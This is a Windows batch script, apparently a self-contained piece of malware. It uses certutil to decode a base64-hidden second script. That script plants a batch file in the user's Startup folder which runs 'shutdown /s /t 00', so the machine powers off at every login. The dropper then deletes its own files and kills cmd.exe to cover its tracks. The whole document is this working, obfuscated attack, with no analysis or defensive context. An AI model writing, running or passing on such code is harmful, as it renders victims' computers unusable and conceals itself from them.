@echo off

echo QGVjaG8gb2ZmDQoNCmRlbCB4LmI2NA0KY2QgJXVzZXJwcm9maWxlJVxBcHBEYXRh > x.b64
echo XFJvYW1pbmdcTWljcm9zb2Z0XFdpbmRvd3NcU3RhcnReIE1lbnVcUHJvZ3JhbXNc >> x.b64
echo U3RhcnR1cFwNCmVjaG8gc2h1dGRvd24uZXhlIC9zIC90IDAwID4gLlx1aC5iYXQN >> x.b64
echo CnN0YXJ0IC9iICIiIGNtZCAvYyBkZWwgIiV+ZjAiJmV4aXQgL2INCmV4aXQNCg0K >> x.b64

certutil -decode "x.b64" "x.bat"
start x.bat
timeout 2 > nul
start /b "" cmd /c del "%~f0" && taskkill /im cmd.exe && exit /b
